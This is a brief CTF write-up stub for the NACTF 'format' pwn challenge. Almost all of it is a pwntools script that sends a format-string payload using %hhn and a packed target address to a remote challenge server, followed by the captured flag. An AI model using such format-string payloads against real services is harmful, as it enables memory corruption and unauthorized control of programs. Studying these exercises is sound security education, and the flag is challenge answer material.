## NACTF: format [pwn]
> description to be added later

#### Format string vulnerability, detailed writeup later after I'm done with lunch.

```python
from pwn import *

#:
#p = process('./format')
p = remote('challenges.ctfd.io', 30266)
#gdb.attach(p.pid, 'break *check_num + 32')
print(p.recvuntil('.\n'))

#: 12 space padding
p.sendline("%60x      %8$hhn{}".format(p64(0x404080)))
print(p.recvuntil('}'))

#: nactf{d0nt_pr1ntf_u54r_1nput_HoUaRUxuGq2lVSHM}
```